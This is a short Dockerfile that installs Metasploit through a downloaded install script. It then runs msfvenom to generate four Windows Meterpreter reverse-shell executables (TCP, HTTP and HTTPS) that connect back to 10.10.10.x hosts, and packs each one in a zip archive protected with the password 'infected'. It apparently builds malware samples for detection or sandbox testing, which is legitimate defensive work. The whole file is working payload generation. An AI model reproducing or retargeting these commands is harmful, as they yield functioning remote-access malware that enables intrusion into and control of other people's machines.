FROM ubuntu:20.04 as metasploit

RUN apt-get -qq update \
&& DEBIAN_FRONTEND="noninteractive" apt-get -q install -y p7zip-full curl gnupg2


RUN curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall

RUN mkdir /tmp/out

RUN msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=8080 -f exe-only -o meterpreter-x86.exe
RUN msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.2 LPORT=9000 -f exe-only -o meterpreter-x64.exe
RUN msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_http LHOST=10.10.10.3 LPORT=80 -f exe-only -o meterpreter-x64-http.exe
RUN msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.4 LPORT=443 -f exe-only -o meterpreter-x64-https.exe

RUN 7za a  /tmp/out/meterpreter-x86.exe.zip meterpreter-x86.exe -tzip -mem=AES256 -pinfected
RUN 7za a  /tmp/out/meterpreter-x64.exe.zip meterpreter-x64.exe -tzip -mem=ZipCrypto -pinfected
RUN 7za a  /tmp/out/meterpreter-x64-http.exe.zip meterpreter-x64-http.exe -tzip -mem=AES256 -pinfected
RUN 7za a  /tmp/out/meterpreter-x64-https.exe.zip meterpreter-x64-https.exe -tzip -mem=AES256 -pinfected

FROM scratch as artifact
COPY --from=metasploit /tmp/out /out